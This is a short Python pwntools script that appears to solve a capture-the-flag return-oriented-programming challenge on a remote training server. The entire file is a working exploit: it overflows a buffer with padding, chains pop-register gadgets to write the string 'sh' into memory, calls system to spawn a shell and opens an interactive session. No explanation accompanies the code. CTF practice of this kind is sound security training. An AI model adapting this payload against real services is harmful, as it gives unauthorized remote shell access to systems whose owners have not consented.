from pwn import *

#r=process('./rop')
r=remote("train2024.hitctf.cn",26779)
context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]

#gdb.attach(r)

payload=flat(
    b'a'*(0x18),
    p64(0x040125b),# pop rdi ; pop rsi ; ret
    ord('s'),
    ord('h'),
    0x40125e,#pop rdx;ret
    0,
    p64(0x0401196),#write_str
    0x040125b,
    0x404090,#(char *)str
    0x404090,
    p64(0x04011EB) #system
)

r.sendlineafter(b"input your name plz",payload)

r.interactive()